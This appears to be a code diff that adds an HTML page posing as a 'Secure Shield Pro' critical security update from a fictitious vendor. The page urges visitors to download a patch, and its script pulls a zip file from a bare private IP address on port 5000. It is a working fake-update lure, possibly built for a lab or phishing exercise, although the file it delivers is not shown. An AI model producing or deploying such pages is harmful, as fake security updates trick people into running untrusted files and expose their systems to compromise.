@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Shield Pro Update</title>
+    <style>
+        /* General Body Styles */
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+        
+        /* Header Styling */
+        header {
+            background-color: #00457C;
+            color: #fff;
+            padding: 20px 0;
+            text-align: center;
+            font-size: 2em;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+        
+        /* Main Content Container */
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        
+        .container h1 {
+            color: #00457C;
+            font-size: 1.75em;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        
+        .container p {
+            font-size: 1.1em;
+            margin-bottom: 30px;
+            color: #666;
+            line-height: 1.6;
+        }
+
+        /* Disclaimer Section */
+        .disclaimer {
+            font-size: 0.9em;
+            color: #555;
+            background-color: #f8f8f8;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .disclaimer h3 {
+            font-size: 1.2em;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .disclaimer p {
+            font-size: 1em;
+            color: #333;
+        }
+        
+        /* Button Styling */
+        .btn {
+            display: inline-block;
+            padding: 12px 25px;
+            background: #00457C;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.1em;
+            text-decoration: none;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease-in-out;
+        }
+        
+        .btn:hover {
+            background: #003652;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        /* Footer Styling */
+        footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 0.9em;
+            color: #888;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 600px) {
+            header {
+                font-size: 1.5em;
+            }
+            .container {
+                margin: 20px;
+                padding: 15px;
+            }
+            .btn {
+                padding: 10px 20px;
+                font-size: 1em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        Secure Shield Pro Update
+    </header>
+
+    <!-- Main Content -->
+    <div class="container">
+        <h1>Critical Update Available</h1>
+        <p>
+            To maintain the security and performance of your system, please download and install the latest Secure Shield Pro update. This update addresses critical vulnerabilities and enhances system protection.
+        </p>
+        
+        <!-- Disclaimer Section -->
+        <div class="disclaimer">
+            <h3>Disclaimer:</h3>
+            <p>
+                This is a **local update** for your Secure Shield Pro system. The file below is hosted on a local server. Please ensure you trust the source and the file before downloading.
+            </p>
+            <p>
+                If you are unsure about the authenticity of the update, please consult your system administrator or IT support team before proceeding.
+            </p>
+        </div>
+
+        <!-- Download Button -->
+        <button class="btn" id="downloadBtn">
+            Download Update
+        </button>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        &copy; 2024 Secure Core Solutions. All rights reserved.
+    </footer>
+
+    <script>
+        // Trigger the download automatically when the button is clicked
+        document.getElementById("downloadBtn").onclick = function() {
+            var link = document.createElement('a');
+            link.href = 'http://192.168.1.4:5000/'; // URL of your file
+            link.download = 'Secure_Shield_Pro_Update.zip'; // Name of the file when downloaded
+            
+            // Append the link to the body
+            document.body.appendChild(link);
+            
+            // Trigger the download by clicking the link
+            link.click();
+            
+            // Clean up by removing the link from the document
+            document.body.removeChild(link);
+        };
+    </script>
+</body>
+</html>
